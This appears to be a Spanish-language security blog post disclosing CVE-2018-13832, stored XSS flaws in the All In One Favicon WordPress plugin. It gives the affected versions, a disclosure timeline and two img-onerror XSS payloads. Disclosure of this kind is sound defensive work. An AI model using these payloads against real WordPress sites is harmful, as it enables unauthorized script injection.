+++
date = "2018-07-10"
title = "CVE-2018-13832 WordPress Plugin All In One Favicon <= 4.6 - Autenticado Múltiples Cross Site Scripting Persistentes"
author = "Javier Olmedo"
toc = false
+++

Durante una de mis auditorias a plugins para [WordPress](https://es.wordpress.org/), he descubierto varias vulnerabilidades del tipo [Cross Site Scripting Persintente (XSS)](https://www.owasp.org/index.php/Cross-site_Scripting_\(XSS\)) en el plugin [All In One Favicon <= 4.6](https://wordpress.org/plugins/all-in-one-favicon/), desarrollado por [Arne Franken de Techotronic](http://www.techotronic.de/). Esta vulnerabilidad ya fue reportada y ha sido asociada al [CVE-2018-13832](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-13832).

## WordPress Plugin CVE-2018-13832

### All In One Favicon <= 4.6 – Autenticado Múltiples Cross Site Scripting Persistentes

[![/images/cve-2018-13832-wp-plugin-all-in-one-favicon-4-6-autenticado-multiples-xss/cve-2018-13832-wp-plugin-all-in-one-favicon-4-6-autenticado-multiples-xss_001.png](/images/cve-2018-13832-wp-plugin-all-in-one-favicon-4-6-autenticado-multiples-xss/cve-2018-13832-wp-plugin-all-in-one-favicon-4-6-autenticado-multiples-xss_001.png)](/images/cve-2018-13832-wp-plugin-all-in-one-favicon-4-6-autenticado-multiples-xss/cve-2018-13832-wp-plugin-all-in-one-favicon-4-6-autenticado-multiples-xss_001.png)

- 📅 Vulnerabilidad descubierta por [Javier Olmedo](https://twitter.com/JJavierOlmedo) el **15/03/2018**
- 💣 Publicada el **10/07/2018**
- 🐛 **CVE-2018-13832**
- 🔗 Link del software [All In One Favicon](https://wordpress.org/plugins/all-in-one-favicon/)
- 🐞 Versión vulnerable <= **4.6**
- 📥 Instalaciones activas **+100,000**

## ¿Cómo explotar la vulnerabilidad?

Para explotar esta vulnerabilidad, necesitamos un **usuario con permisos de administración**, los parámetros vulnerables (8) son los siguientes:

[![/images/cve-2018-13832-wp-plugin-all-in-one-favicon-4-6-autenticado-multiples-xss/cve-2018-13832-wp-plugin-all-in-one-favicon-4-6-autenticado-multiples-xss_002.png](/images/cve-2018-13832-wp-plugin-all-in-one-favicon-4-6-autenticado-multiples-xss/cve-2018-13832-wp-plugin-all-in-one-favicon-4-6-autenticado-multiples-xss_002.png)](/images/cve-2018-13832-wp-plugin-all-in-one-favicon-4-6-autenticado-multiples-xss/cve-2018-13832-wp-plugin-all-in-one-favicon-4-6-autenticado-multiples-xss_002.png)

Puede explotarse con los siguientes payloads:

```txt
💉 "><img src=a onerror=alert(1)>
💉 "><img src=a onerror=alert(String.fromCharCode(88,83,83))>
```

## Prueba de concepto (POC)

[![/images/cve-2018-13832-wp-plugin-all-in-one-favicon-4-6-autenticado-multiples-xss/cve-2018-13832-wp-plugin-all-in-one-favicon-4-6-autenticado-multiples-xss_003.gif](/images/cve-2018-13832-wp-plugin-all-in-one-favicon-4-6-autenticado-multiples-xss/cve-2018-13832-wp-plugin-all-in-one-favicon-4-6-autenticado-multiples-xss_003.gif)](/images/cve-2018-13832-wp-plugin-all-in-one-favicon-4-6-autenticado-multiples-xss/cve-2018-13832-wp-plugin-all-in-one-favicon-4-6-autenticado-multiples-xss_003.gif)

## Timeline

- **15/03/2018** Informo al desarrollador de la vulnerabilidad (sin contestación) 😥
- **27/05/2018** Vuelvo a informar la vulnerabilidad por segunda vez (también sin contestación) 😭
- **08/07/2018** Solicito CVE
- **10/07/2018** Hago pública la vulnerabilidad

## Referencias

- CCN CERT – [https://www.ccn-cert.cni.es/seguridad-al-dia/vulnerabilidades/view/24136.html](https://www.ccn-cert.cni.es/seguridad-al-dia/vulnerabilidades/view/24136.html)
- CVE-MITRE – [http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-13832](http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-13832)
- CVE Details – [https://www.cvedetails.com/cve/CVE-2018-13832/](https://www.cvedetails.com/cve/CVE-2018-13832/)
- NIST – [https://nvd.nist.gov/vuln/detail/CVE-2018-13832](https://nvd.nist.gov/vuln/detail/CVE-2018-13832)
- Exploit DB – [https://www.exploit-db.com/exploits/45056/](https://www.exploit-db.com/exploits/45056/)
- 0Day Today – [https://es.0day.today/exploits/30752](https://es.0day.today/exploits/30752)
- CX Security – [https://cxsecurity.com/cveshow/CVE-2018-13832/](https://cxsecurity.com/cveshow/CVE-2018-13832/)
- Packet Storm – [https://packetstormsecurity.com/files/148617/WordPress-All-In-One-Favicon-4.6-Cross-Site-Scripting.html](https://packetstormsecurity.com/files/148617/WordPress-All-In-One-Favicon-4.6-Cross-Site-Scripting.html)

Un saludo a todos!! 👋